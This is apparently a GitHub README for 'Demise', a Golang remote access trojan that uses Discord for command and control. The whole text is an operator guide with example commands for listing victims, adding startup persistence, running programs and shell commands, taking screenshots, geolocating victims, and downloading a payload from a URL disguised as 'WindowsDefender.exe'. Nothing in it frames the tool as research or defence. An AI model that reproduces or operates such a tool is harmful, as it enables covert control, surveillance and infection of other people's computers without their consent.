# Demise

Demise is Golang malware that uses Discord for communication. 

![image](https://user-images.githubusercontent.com/99378532/184524385-89bda0f6-b46d-4e5e-868f-f044dac0ae1d.png)

# Demo

![image](https://user-images.githubusercontent.com/99378532/184524374-a18668bc-7888-4912-b4be-269bedde7b6e.png)

#Commands

show victims connected
$victims

extract a zip file
$unzip <username> <.zip file on drive> <directory to extract in>
Example:
$unzip DESKTOP-2HJUUK6\Tod main.zip C:\msys64\home\Tod\projects\go\src\github.com\0xSegFaulted\

run Demise on startup
$startup <username>
Example
$startup DESKTOP-2HJUUK6\Tod

run an executable (some executables require admin)
$run <username> <location of exe>
Example
$run DESKTOP-2HJUUK6\Tod file.exe

download file
$dl <username> <url> <name of file>
Example
$dl DESKTOP-2HJUUK6\Tod http://somesite.com/payload.exe WindowsDefender.exe

run commands
$shell <username> <command> <flags... optional>
Example 
$shell DESKTOP-2HJUUK6\Tod whoami

screenshot desktop
$ss <username>
Example
$ss DESKTOP-2HJUUK6\Tod

get IP
$ip <username>
Example
$ip DESKTOP-2HJUUK6\Tod

kill session
$kill <username>
$kill DESKTOP-2HJUUK6\Tod

geolocate
$geoloc <username>
$geoloc DESKTOP-2HJUUK6\Tod
